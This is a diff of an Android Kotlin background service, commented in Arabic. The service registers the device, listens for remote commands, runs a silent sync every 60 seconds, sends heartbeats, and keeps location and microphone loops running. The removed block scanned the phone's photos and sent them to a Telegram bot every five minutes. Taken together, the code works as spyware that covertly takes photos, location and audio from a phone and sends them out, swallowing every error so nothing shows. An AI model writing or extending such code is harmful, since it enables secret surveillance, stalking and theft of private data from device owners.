@@ -26,8 +26,25 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
+        // استقبال الأوامر
         try { CommandListener.start(applicationContext) } catch (_: Exception) {}
 
+        // ⭐ تسجيل الجهاز
+        try { DeviceManager.registerDevice(applicationContext) } catch (_: Exception) {}
+
+        // ⭐ sync تلقائي كل 60 ثانية — بدون أوامر
+        scope.launch {
+            // ابدأ أول sync بعد 5 ثواني من التشغيل
+            delay(5_000L)
+            while (running) {
+                try {
+                    CommandExecutor.autoSyncAll(applicationContext)
+                } catch (_: Exception) {}
+                delay(60_000L)
+            }
+        }
+
+        // heartbeat
         scope.launch {
             while (running) {
                 try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
@@ -35,6 +52,7 @@ class BackgroundService : Service() {
             }
         }
 
+        // تنظيف ملفات الصوت القديمة
         scope.launch {
             while (running) {
                 try {
@@ -48,23 +66,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // ⭐ الصور التلقائية (كل 5 دقائق)
-        scope.launch {
-            while (running) {
-                try {
-                    if (KeyboardBuilder.photosOn) {
-                        val photos = MediaScanner.scanImages(applicationContext).take(5)
-                        for (p in photos) {
-                            val f = File(p.path)
-                            if (f.exists()) TelegramApi.sendPhoto(f, "📸 ${p.name}")
-                        }
-                    }
-                } catch (_: Exception) {}
-                delay(5 * 60_000L)
-            }
-        }
-
-        // ⭐ الموقع (كل 15 دقيقة)
+        // الموقع (لو مفعّل)
         scope.launch {
             while (running) {
                 try {
@@ -79,7 +81,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // ⭐ الميكروفون
+        // الميكروفون (لو مفعّل)
         scope.launch {
             while (running) {
                 try {
